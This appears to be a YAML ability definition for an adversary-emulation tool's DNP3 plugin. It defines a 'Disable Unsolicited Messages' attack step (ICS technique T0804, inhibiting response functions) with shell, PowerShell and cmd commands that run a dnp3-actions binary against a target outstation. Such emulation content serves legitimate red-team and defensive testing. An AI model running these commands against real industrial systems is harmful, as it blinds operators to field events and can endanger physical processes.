- id: 06d24daa-553d-4a2b-ac15-de2f9fe43731
  name: DNP3 (TCP) - Disable Unsolicited Messages
  description: Disable unsolicited messages on the outstation.
  tactic: inhibit-response-function 
  technique_id: T0804
  technique_name: Block Reporting Message
  executors:
  - platform: linux
    name: sh
    command: >
      ./dnp3-actions tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
      disable-unsolicited #{dnp3.message.classes}
    payloads:
    - dnp3-actions
    timeout: 60
  - platform: windows
    name: psh
    command: >
      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
      disable-unsolicited #{dnp3.message.classes}
    payloads:
    - dnp3-actions.exe
    timeout: 60
  - platform: windows
    name: cmd
    command: >
      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
      disable-unsolicited #{dnp3.message.classes}
    payloads:
    - dnp3-actions.exe
    timeout: 60
  - platform: darwin
    name: sh
    command: >
      ./dnp3-actions_darwin tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
      disable-unsolicited #{dnp3.message.classes}
    payloads:
    - dnp3-actions_darwin
    timeout: 60
  repeatable: false
  plugin: dnp3

